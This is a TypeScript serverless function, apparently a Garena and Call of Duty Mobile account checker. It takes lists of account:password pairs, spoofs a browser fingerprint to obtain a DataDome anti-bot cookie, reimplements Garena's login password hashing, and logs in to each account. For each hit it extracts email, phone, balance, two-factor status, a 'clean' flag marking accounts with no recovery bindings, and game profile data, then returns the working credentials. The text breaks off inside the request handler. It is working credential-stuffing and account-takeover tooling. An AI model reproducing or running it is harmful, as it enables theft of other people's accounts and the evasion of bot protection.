import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

// Rate limiting configuration
const RATE_LIMIT_MAX_REQUESTS = 10; // Max requests per window
const RATE_LIMIT_WINDOW_MS = 60000; // 1 minute window
const MAX_ACCOUNTS_PER_REQUEST = 5; // Max accounts per single request
const RETRY_DELAYS = [1000, 2000, 5000]; // Retry delays in ms

// In-memory rate limit store (resets on function cold start)
const rateLimitStore = new Map<string, { count: number; windowStart: number }>();

function checkRateLimit(clientId: string): { allowed: boolean; retryAfter?: number } {
  const now = Date.now();
  const record = rateLimitStore.get(clientId);
  
  if (!record || now - record.windowStart > RATE_LIMIT_WINDOW_MS) {
    // New window
    rateLimitStore.set(clientId, { count: 1, windowStart: now });
    return { allowed: true };
  }
  
  if (record.count >= RATE_LIMIT_MAX_REQUESTS) {
    const retryAfter = Math.ceil((record.windowStart + RATE_LIMIT_WINDOW_MS - now) / 1000);
    return { allowed: false, retryAfter };
  }
  
  record.count++;
  return { allowed: true };
}

// Retry wrapper for API calls
async function withRetry<T>(
  fn: () => Promise<T>,
  maxRetries: number = 3,
  context: string = 'API call'
): Promise<T> {
  let lastError: Error | null = null;
  
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error as Error;
      console.log(`[RETRY] ${context} attempt ${attempt + 1}/${maxRetries + 1} failed: ${error}`);
      
      if (attempt < maxRetries) {
        const delay = RETRY_DELAYS[Math.min(attempt, RETRY_DELAYS.length - 1)];
        console.log(`[RETRY] Waiting ${delay}ms before retry...`);
        await new Promise(resolve => setTimeout(resolve, delay));
      }
    }
  }
  
  throw lastError;
}

// AES ECB encryption for password hashing (simplified for Deno)
function hexToBytes(hex: string): Uint8Array {
  const bytes = new Uint8Array(hex.length / 2);
  for (let i = 0; i < hex.length; i += 2) {
    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
  }
  return bytes;
}

function bytesToHex(bytes: Uint8Array): string {
  return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

async function md5(message: string): Promise<string> {
  const msgUint8 = new TextEncoder().encode(message);
  const hashBuffer = await crypto.subtle.digest('MD5', msgUint8).catch(() => null);
  
  // Fallback MD5 implementation since Web Crypto doesn't support MD5
  if (!hashBuffer) {
    return md5Fallback(message);
  }
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// Simple MD5 implementation
function md5Fallback(string: string): string {
  function rotateLeft(lValue: number, iShiftBits: number) {
    return (lValue << iShiftBits) | (lValue >>> (32 - iShiftBits));
  }

  function addUnsigned(lX: number, lY: number) {
    const lX8 = (lX & 0x80000000);
    const lY8 = (lY & 0x80000000);
    const lX4 = (lX & 0x40000000);
    const lY4 = (lY & 0x40000000);
    const lResult = (lX & 0x3FFFFFFF) + (lY & 0x3FFFFFFF);
    if (lX4 & lY4) return (lResult ^ 0x80000000 ^ lX8 ^ lY8);
    if (lX4 | lY4) {
      if (lResult & 0x40000000) return (lResult ^ 0xC0000000 ^ lX8 ^ lY8);
      else return (lResult ^ 0x40000000 ^ lX8 ^ lY8);
    } else return (lResult ^ lX8 ^ lY8);
  }

  function F(x: number, y: number, z: number) { return (x & y) | ((~x) & z); }
  function G(x: number, y: number, z: number) { return (x & z) | (y & (~z)); }
  function H(x: number, y: number, z: number) { return (x ^ y ^ z); }
  function I(x: number, y: number, z: number) { return (y ^ (x | (~z))); }

  function FF(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
    a = addUnsigned(a, addUnsigned(addUnsigned(F(b, c, d), x), ac));
    return addUnsigned(rotateLeft(a, s), b);
  }

  function GG(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
    a = addUnsigned(a, addUnsigned(addUnsigned(G(b, c, d), x), ac));
    return addUnsigned(rotateLeft(a, s), b);
  }

  function HH(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
    a = addUnsigned(a, addUnsigned(addUnsigned(H(b, c, d), x), ac));
    return addUnsigned(rotateLeft(a, s), b);
  }

  function II(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
    a = addUnsigned(a, addUnsigned(addUnsigned(I(b, c, d), x), ac));
    return addUnsigned(rotateLeft(a, s), b);
  }

  function convertToWordArray(string: string) {
    let lWordCount;
    const lMessageLength = string.length;
    const lNumberOfWords_temp1 = lMessageLength + 8;
    const lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64;
    const lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16;
    const lWordArray = Array(lNumberOfWords - 1);
    let lBytePosition = 0;
    let lByteCount = 0;
    while (lByteCount < lMessageLength) {
      lWordCount = (lByteCount - (lByteCount % 4)) / 4;
      lBytePosition = (lByteCount % 4) * 8;
      lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount) << lBytePosition));
      lByteCount++;
    }
    lWordCount = (lByteCount - (lByteCount % 4)) / 4;
    lBytePosition = (lByteCount % 4) * 8;
    lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 << lBytePosition);
    lWordArray[lNumberOfWords - 2] = lMessageLength << 3;
    lWordArray[lNumberOfWords - 1] = lMessageLength >>> 29;
    return lWordArray;
  }

  function wordToHex(lValue: number) {
    let wordToHexValue = "", wordToHexValue_temp = "", lByte, lCount;
    for (lCount = 0; lCount <= 3; lCount++) {
      lByte = (lValue >>> (lCount * 8)) & 255;
      wordToHexValue_temp = "0" + lByte.toString(16);
      wordToHexValue = wordToHexValue + wordToHexValue_temp.substr(wordToHexValue_temp.length - 2, 2);
    }
    return wordToHexValue;
  }

  const x = convertToWordArray(string);
  let a = 0x67452301, b = 0xEFCDAB89, c = 0x98BADCFE, d = 0x10325476;
  const S11 = 7, S12 = 12, S13 = 17, S14 = 22;
  const S21 = 5, S22 = 9, S23 = 14, S24 = 20;
  const S31 = 4, S32 = 11, S33 = 16, S34 = 23;
  const S41 = 6, S42 = 10, S43 = 15, S44 = 21;

  for (let k = 0; k < x.length; k += 16) {
    const AA = a, BB = b, CC = c, DD = d;
    a = FF(a, b, c, d, x[k + 0], S11, 0xD76AA478);
    d = FF(d, a, b, c, x[k + 1], S12, 0xE8C7B756);
    c = FF(c, d, a, b, x[k + 2], S13, 0x242070DB);
    b = FF(b, c, d, a, x[k + 3], S14, 0xC1BDCEEE);
    a = FF(a, b, c, d, x[k + 4], S11, 0xF57C0FAF);
    d = FF(d, a, b, c, x[k + 5], S12, 0x4787C62A);
    c = FF(c, d, a, b, x[k + 6], S13, 0xA8304613);
    b = FF(b, c, d, a, x[k + 7], S14, 0xFD469501);
    a = FF(a, b, c, d, x[k + 8], S11, 0x698098D8);
    d = FF(d, a, b, c, x[k + 9], S12, 0x8B44F7AF);
    c = FF(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1);
    b = FF(b, c, d, a, x[k + 11], S14, 0x895CD7BE);
    a = FF(a, b, c, d, x[k + 12], S11, 0x6B901122);
    d = FF(d, a, b, c, x[k + 13], S12, 0xFD987193);
    c = FF(c, d, a, b, x[k + 14], S13, 0xA679438E);
    b = FF(b, c, d, a, x[k + 15], S14, 0x49B40821);
    a = GG(a, b, c, d, x[k + 1], S21, 0xF61E2562);
    d = GG(d, a, b, c, x[k + 6], S22, 0xC040B340);
    c = GG(c, d, a, b, x[k + 11], S23, 0x265E5A51);
    b = GG(b, c, d, a, x[k + 0], S24, 0xE9B6C7AA);
    a = GG(a, b, c, d, x[k + 5], S21, 0xD62F105D);
    d = GG(d, a, b, c, x[k + 10], S22, 0x2441453);
    c = GG(c, d, a, b, x[k + 15], S23, 0xD8A1E681);
    b = GG(b, c, d, a, x[k + 4], S24, 0xE7D3FBC8);
    a = GG(a, b, c, d, x[k + 9], S21, 0x21E1CDE6);
    d = GG(d, a, b, c, x[k + 14], S22, 0xC33707D6);
    c = GG(c, d, a, b, x[k + 3], S23, 0xF4D50D87);
    b = GG(b, c, d, a, x[k + 8], S24, 0x455A14ED);
    a = GG(a, b, c, d, x[k + 13], S21, 0xA9E3E905);
    d = GG(d, a, b, c, x[k + 2], S22, 0xFCEFA3F8);
    c = GG(c, d, a, b, x[k + 7], S23, 0x676F02D9);
    b = GG(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A);
    a = HH(a, b, c, d, x[k + 5], S31, 0xFFFA3942);
    d = HH(d, a, b, c, x[k + 8], S32, 0x8771F681);
    c = HH(c, d, a, b, x[k + 11], S33, 0x6D9D6122);
    b = HH(b, c, d, a, x[k + 14], S34, 0xFDE5380C);
    a = HH(a, b, c, d, x[k + 1], S31, 0xA4BEEA44);
    d = HH(d, a, b, c, x[k + 4], S32, 0x4BDECFA9);
    c = HH(c, d, a, b, x[k + 7], S33, 0xF6BB4B60);
    b = HH(b, c, d, a, x[k + 10], S34, 0xBEBFBC70);
    a = HH(a, b, c, d, x[k + 13], S31, 0x289B7EC6);
    d = HH(d, a, b, c, x[k + 0], S32, 0xEAA127FA);
    c = HH(c, d, a, b, x[k + 3], S33, 0xD4EF3085);
    b = HH(b, c, d, a, x[k + 6], S34, 0x4881D05);
    a = HH(a, b, c, d, x[k + 9], S31, 0xD9D4D039);
    d = HH(d, a, b, c, x[k + 12], S32, 0xE6DB99E5);
    c = HH(c, d, a, b, x[k + 15], S33, 0x1FA27CF8);
    b = HH(b, c, d, a, x[k + 2], S34, 0xC4AC5665);
    a = II(a, b, c, d, x[k + 0], S41, 0xF4292244);
    d = II(d, a, b, c, x[k + 7], S42, 0x432AFF97);
    c = II(c, d, a, b, x[k + 14], S43, 0xAB9423A7);
    b = II(b, c, d, a, x[k + 5], S44, 0xFC93A039);
    a = II(a, b, c, d, x[k + 12], S41, 0x655B59C3);
    d = II(d, a, b, c, x[k + 3], S42, 0x8F0CCC92);
    c = II(c, d, a, b, x[k + 10], S43, 0xFFEFF47D);
    b = II(b, c, d, a, x[k + 1], S44, 0x85845DD1);
    a = II(a, b, c, d, x[k + 8], S41, 0x6FA87E4F);
    d = II(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0);
    c = II(c, d, a, b, x[k + 6], S43, 0xA3014314);
    b = II(b, c, d, a, x[k + 13], S44, 0x4E0811A1);
    a = II(a, b, c, d, x[k + 4], S41, 0xF7537E82);
    d = II(d, a, b, c, x[k + 11], S42, 0xBD3AF235);
    c = II(c, d, a, b, x[k + 2], S43, 0x2AD7D2BB);
    b = II(b, c, d, a, x[k + 9], S44, 0xEB86D391);
    a = addUnsigned(a, AA);
    b = addUnsigned(b, BB);
    c = addUnsigned(c, CC);
    d = addUnsigned(d, DD);
  }

  return (wordToHex(a) + wordToHex(b) + wordToHex(c) + wordToHex(d)).toLowerCase();
}

async function sha256(message: string): Promise<string> {
  const msgUint8 = new TextEncoder().encode(message);
  const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// AES ECB encryption implementation
function aesEcbEncrypt(plaintext: string, key: string): string {
  const plaintextBytes = hexToBytes(plaintext);
  const keyBytes = hexToBytes(key);
  
  // AES S-box
  const sBox = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
  ];

  const rCon = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36];

  function subBytes(state: number[][]): void {
    for (let i = 0; i < 4; i++) {
      for (let j = 0; j < 4; j++) {
        state[i][j] = sBox[state[i][j]];
      }
    }
  }

  function shiftRows(state: number[][]): void {
    for (let i = 1; i < 4; i++) {
      const temp = state[i].slice(0, i);
      for (let j = 0; j < 4 - i; j++) {
        state[i][j] = state[i][j + i];
      }
      for (let j = 0; j < i; j++) {
        state[i][4 - i + j] = temp[j];
      }
    }
  }

  function xtime(x: number): number {
    return ((x << 1) ^ (((x >>> 7) & 1) * 0x1b)) & 0xff;
  }

  function mixColumns(state: number[][]): void {
    for (let i = 0; i < 4; i++) {
      const a = state[0][i];
      const b = state[1][i];
      const c = state[2][i];
      const d = state[3][i];
      state[0][i] = xtime(a) ^ xtime(b) ^ b ^ c ^ d;
      state[1][i] = a ^ xtime(b) ^ xtime(c) ^ c ^ d;
      state[2][i] = a ^ b ^ xtime(c) ^ xtime(d) ^ d;
      state[3][i] = xtime(a) ^ a ^ b ^ c ^ xtime(d);
    }
  }

  function addRoundKey(state: number[][], roundKey: number[][]): void {
    for (let i = 0; i < 4; i++) {
      for (let j = 0; j < 4; j++) {
        state[i][j] ^= roundKey[i][j];
      }
    }
  }

  function keyExpansion(key: Uint8Array): number[][][] {
    const roundKeys: number[][][] = [];
    const w: number[][] = [];
    
    // First round key is the key itself
    for (let i = 0; i < 4; i++) {
      w[i] = [key[4 * i], key[4 * i + 1], key[4 * i + 2], key[4 * i + 3]];
    }
    
    for (let i = 4; i < 44; i++) {
      const temp = w[i - 1].slice();
      if (i % 4 === 0) {
        const rotated = [temp[1], temp[2], temp[3], temp[0]];
        const subbed = rotated.map(b => sBox[b]);
        subbed[0] ^= rCon[(i / 4) - 1];
        for (let j = 0; j < 4; j++) {
          temp[j] = subbed[j];
        }
      }
      w[i] = [];
      for (let j = 0; j < 4; j++) {
        w[i][j] = w[i - 4][j] ^ temp[j];
      }
    }
    
    for (let round = 0; round < 11; round++) {
      const roundKey: number[][] = [[], [], [], []];
      for (let i = 0; i < 4; i++) {
        for (let j = 0; j < 4; j++) {
          roundKey[j][i] = w[round * 4 + i][j];
        }
      }
      roundKeys.push(roundKey);
    }
    
    return roundKeys;
  }

  // Encrypt single block
  const state: number[][] = [[], [], [], []];
  for (let i = 0; i < 16; i++) {
    state[i % 4][Math.floor(i / 4)] = plaintextBytes[i] || 0;
  }

  const roundKeys = keyExpansion(keyBytes.slice(0, 32));
  
  addRoundKey(state, roundKeys[0]);
  
  for (let round = 1; round < 10; round++) {
    subBytes(state);
    shiftRows(state);
    mixColumns(state);
    addRoundKey(state, roundKeys[round]);
  }
  
  subBytes(state);
  shiftRows(state);
  addRoundKey(state, roundKeys[10]);
  
  // Extract result
  const result = new Uint8Array(16);
  for (let i = 0; i < 4; i++) {
    for (let j = 0; j < 4; j++) {
      result[i * 4 + j] = state[j][i];
    }
  }
  
  return bytesToHex(result).substring(0, 32);
}

async function hashPassword(password: string, v1: string, v2: string): Promise<string> {
  const passMd5 = md5Fallback(decodeURIComponent(password));
  const innerHash = await sha256(passMd5 + v1);
  const outerHash = await sha256(innerHash + v2);
  return aesEcbEncrypt(passMd5, outerHash);
}

async function getDatadomeCookie(): Promise<string | null> {
  const url = 'https://dd.garena.com/js/';
  const headers = {
    'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://account.garena.com',
    'referer': 'https://account.garena.com/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
  };

  const jsData = {
    "ttst": 76.7,
    "ifov": false,
    "hc": 4,
    "br_oh": 824,
    "br_ow": 1536,
    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "wbd": false,
    "dp0": true,
    "tagpu": 5.738,
    "br_h": 738,
    "br_w": 260,
    "isf": false,
    "nddc": 1,
    "rs_h": 864,
    "rs_w": 1536,
    "rs_cd": 24,
    "lg": "en-US",
    "pr": 1.25,
    "ars_h": 824,
    "ars_w": 1536,
    "tz": -480
  };

  const payload = new URLSearchParams({
    jsData: JSON.stringify(jsData),
    eventCounters: '[]',
    jsType: 'ch',
    cid: 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
    ddk: 'AE3F04AD3F0D3A462481A337485081',
    Referer: 'https://account.garena.com/',
    request: '/',
    responsePage: 'origin',
    ddv: '4.35.4'
  });

  try {
    const response = await fetch(url, {
      method: 'POST',
      headers,
      body: payload.toString()
    });

    const data = await response.json();
    if (data.status === 200 && data.cookie) {
      const cookieString = data.cookie;
      const datadome = cookieString.split(';')[0].split('=')[1];
      return datadome;
    }
    return null;
  } catch (error) {
    console.error('Error getting DataDome cookie:', error);
    return null;
  }
}

async function prelogin(account: string, datadome: string): Promise<{ v1: string; v2: string; newDatadome?: string } | null> {
  const url = new URL('https://sso.garena.com/api/prelogin');
  url.searchParams.set('app_id', '10100');
  url.searchParams.set('account', account);
  url.searchParams.set('format', 'json');
  url.searchParams.set('id', Date.now().toString());

  const headers: Record<string, string> = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'referer': `https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=${encodeURIComponent(account)}`,
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
  };

  if (datadome) {
    headers['cookie'] = `datadome=${datadome}`;
  }

  try {
    const response = await fetch(url.toString(), { headers });
    
    // Extract new datadome from response headers
    const setCookie = response.headers.get('set-cookie');
    let newDatadome: string | undefined;
    if (setCookie && setCookie.includes('datadome=')) {
      const match = setCookie.match(/datadome=([^;]+)/);
      if (match) newDatadome = match[1];
    }

    if (response.status === 403) {
      return null;
    }

    const data = await response.json();
    
    if (data.error) {
      return null;
    }

    const v1 = data.v1;
    const v2 = data.v2;

    if (!v1 || !v2) {
      return null;
    }

    return { v1, v2, newDatadome };
  } catch (error) {
    console.error('Prelogin error:', error);
    return null;
  }
}

async function login(account: string, password: string, v1: string, v2: string, datadome: string): Promise<{ ssoKey: string | null; newDatadome?: string }> {
  const hashedPassword = await hashPassword(password, v1, v2);
  
  const url = new URL('https://sso.garena.com/api/login');
  url.searchParams.set('app_id', '10100');
  url.searchParams.set('account', account);
  url.searchParams.set('password', hashedPassword);
  url.searchParams.set('redirect_uri', 'https://account.garena.com/');
  url.searchParams.set('format', 'json');
  url.searchParams.set('id', Date.now().toString());

  const headers: Record<string, string> = {
    'accept': 'application/json, text/plain, */*',
    'referer': 'https://account.garena.com/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
  };

  if (datadome) {
    headers['cookie'] = `datadome=${datadome}`;
  }

  try {
    const response = await fetch(url.toString(), { headers });
    
    // Extract cookies
    const setCookie = response.headers.get('set-cookie');
    let newDatadome: string | undefined;
    let ssoKey: string | null = null;
    
    if (setCookie) {
      if (setCookie.includes('datadome=')) {
        const match = setCookie.match(/datadome=([^;]+)/);
        if (match) newDatadome = match[1];
      }
      if (setCookie.includes('sso_key=')) {
        const match = setCookie.match(/sso_key=([^;]+)/);
        if (match) ssoKey = match[1];
      }
    }

    const data = await response.json();
    
    if (data.error) {
      return { ssoKey: null, newDatadome };
    }

    return { ssoKey, newDatadome };
  } catch (error) {
    console.error('Login error:', error);
    return { ssoKey: null };
  }
}

async function getAccountInfo(ssoKey: string, datadome: string): Promise<any> {
  const headers: Record<string, string> = {
    'accept': '*/*',
    'referer': 'https://account.garena.com/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
  };

  const cookies = [];
  if (ssoKey) cookies.push(`sso_key=${ssoKey}`);
  if (datadome) cookies.push(`datadome=${datadome}`);
  if (cookies.length > 0) headers['cookie'] = cookies.join('; ');

  try {
    const response = await fetch('https://account.garena.com/api/account/init', { headers });
    
    if (response.status === 403) {
      return { error: 'IP_BLOCKED' };
    }

    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Account info error:', error);
    return { error: 'FETCH_ERROR' };
  }
}

async function getCodmAccessToken(ssoKey: string, datadome: string): Promise<string | null> {
  const headers: Record<string, string> = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Accept': '*/*',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/'
  };

  const cookies = [];
  if (ssoKey) cookies.push(`sso_key=${ssoKey}`);
  if (datadome) cookies.push(`datadome=${datadome}`);
  if (cookies.length > 0) headers['cookie'] = cookies.join('; ');

  const body = `client_id=100082&response_type=token&redirect_uri=${encodeURIComponent('https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/')}&format=json&id=${Date.now()}`;

  try {
    const response = await fetch('https://auth.garena.com/oauth/token/grant', {
      method: 'POST',
      headers,
      body
    });

    const data = await response.json();
    return data.access_token || null;
  } catch (error) {
    console.error('CODM token error:', error);
    return null;
  }
}

async function processCodmCallback(accessToken: string): Promise<{ token: string | null; status: string }> {
  try {
    // First callback
    const codmCallbackUrl = `https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/&access_token=${accessToken}`;
    
    const headers = {
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'referer': 'https://auth.garena.com/',
      'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
    };

    await fetch(codmCallbackUrl, { headers, redirect: 'manual' });

    // Second callback
    const apiCallbackUrl = `https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token=${accessToken}`;
    const apiResponse = await fetch(apiCallbackUrl, { headers, redirect: 'manual' });
    
    const location = apiResponse.headers.get('location') || '';
    
    if (location.includes('err=3')) {
      return { token: null, status: 'no_codm' };
    } else if (location.includes('token=')) {
      const token = location.split('token=')[1]?.split('&')[0];
      return { token: token || null, status: 'success' };
    }
    
    return { token: null, status: 'unknown_error' };
  } catch (error) {
    console.error('CODM callback error:', error);
    return { token: null, status: 'error' };
  }
}

async function getCodmUserInfo(token: string): Promise<any> {
  const headers = {
    'accept': 'application/json, text/plain, */*',
    'codm-delete-token': token,
    'origin': 'https://delete-request.codm.garena.co.id',
    'referer': 'https://delete-request.codm.garena.co.id/',
    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
  };

  try {
    const response = await fetch('https://api-delete-request.codm.garena.co.id/oauth/check_login/', { headers });
    const data = await response.json();
    
    const user = data.user || {};
    return {
      codm_nickname: user.codm_nickname || 'N/A',
      codm_level: user.codm_level || 'N/A',
      region: user.region || 'N/A',
      uid: user.uid || 'N/A',
      open_id: user.open_id || 'N/A'
    };
  } catch (error) {
    console.error('CODM user info error:', error);
    return null;
  }
}

function parseAccountDetails(data: any): any {
  const userInfo = data.user_info || data || {};
  
  const email = userInfo.email || 'N/A';
  const mobile = userInfo.mobile_no || 'N/A';
  const fbConnected = userInfo.is_fbconnect_enabled || false;
  const emailVerified = userInfo.email_v === 1;
  
  const binds: string[] = [];
  if (email !== 'N/A' && email && !email.startsWith('***') && email.includes('@')) binds.push('Email');
  if (mobile !== 'N/A' && mobile && String(mobile).trim()) binds.push('Phone');
  if (fbConnected) binds.push('Facebook');
  if (userInfo.idcard && String(userInfo.idcard).trim()) binds.push('ID Card');
  
  const isClean = !emailVerified && binds.length === 0;
  
  return {
    uid: userInfo.uid || 'N/A',
    username: userInfo.username || 'N/A',
    nickname: userInfo.nickname || 'N/A',
    email: email,
    email_verified: emailVerified,
    mobile: mobile,
    country: userInfo.acc_country || 'N/A',
    shell_balance: userInfo.shell || 0,
    is_clean: isClean,
    bind_status: isClean ? 'Clean' : `Bound (${binds.join(', ')})`,
    security: {
      two_step_verify: userInfo.two_step_verify_enable || false,
      authenticator: userInfo.authenticator_enable || false,
      facebook: fbConnected
    }
  };
}

async function checkAccount(account: string, password: string): Promise<any> {
  try {
    // Get datadome cookie
    const datadome = await getDatadomeCookie();
    if (!datadome) {
      return { status: 'error', message: 'Failed to get security cookie' };
    }

    // Prelogin
    const preloginResult = await prelogin(account, datadome);
    if (!preloginResult) {
      return { status: 'invalid', message: 'Prelogin failed - Invalid account' };
    }

    const currentDatadome = preloginResult.newDatadome || datadome;

    // Login
    const loginResult = await login(account, password, preloginResult.v1, preloginResult.v2, currentDatadome);
    if (!loginResult.ssoKey) {
      return { status: 'invalid', message: 'Login failed - Invalid credentials' };
    }

    const finalDatadome = loginResult.newDatadome || currentDatadome;

    // Get account info
    const accountInfo = await getAccountInfo(loginResult.ssoKey, finalDatadome);
    if (accountInfo.error) {
      return { status: 'error', message: accountInfo.error };
    }

    const details = parseAccountDetails(accountInfo);

    // Check CODM
    const codmAccessToken = await getCodmAccessToken(loginResult.ssoKey, finalDatadome);
    let codmInfo = null;
    let hasCodm = false;

    if (codmAccessToken) {
      const codmCallback = await processCodmCallback(codmAccessToken);
      if (codmCallback.status === 'success' && codmCallback.token) {
        codmInfo = await getCodmUserInfo(codmCallback.token);
        hasCodm = codmInfo && codmInfo.codm_nickname !== 'N/A';
      }
    }

    return {
      status: 'valid',
      account,
      password,
      details,
      codm: codmInfo,
      hasCodm,
      isClean: details.is_clean
    };
  } catch (error) {
    console.error('Check account error:', error);
    return { status: 'error', message: String(error) };
  }
}

serve(async (req) => {
  // Handle CORS preflight
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    // Get client identifier for rate limiting
    const clientIp = req.headers.get('x-forwarded-for') || 
                     req.headers.get('x-real-ip') || 
                     'unknown';
    const clientId = clientIp.split(',')[0].trim();
    
    console.log(`[REQUEST] Incoming request from client: ${clientId}`);
    
    // Check rate limit
    const rateCheck = checkRateLimit(clientId);
    if (!rateCheck.allowed) {
      console.log(`[RATE_LIMIT] Client ${clientId} exceeded rate limit`);
      return new Response(
        JSON.stringify({ 
          error: "Rate limit exceeded", 
          retryAfter: rateCheck.retryAfter,
          message: `Too many requests. Please wait ${rateCheck.retryAfter} seconds.`
        }),
        { 
          status: 429, 
          headers: { 
            ...corsHeaders, 
            "Content-Type": "application/json",
            "Retry-After": String(rateCheck.retryAfter)
          } 
        }
      );
    }

    const { accounts } = await req.json();
    
    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
      return new Response(
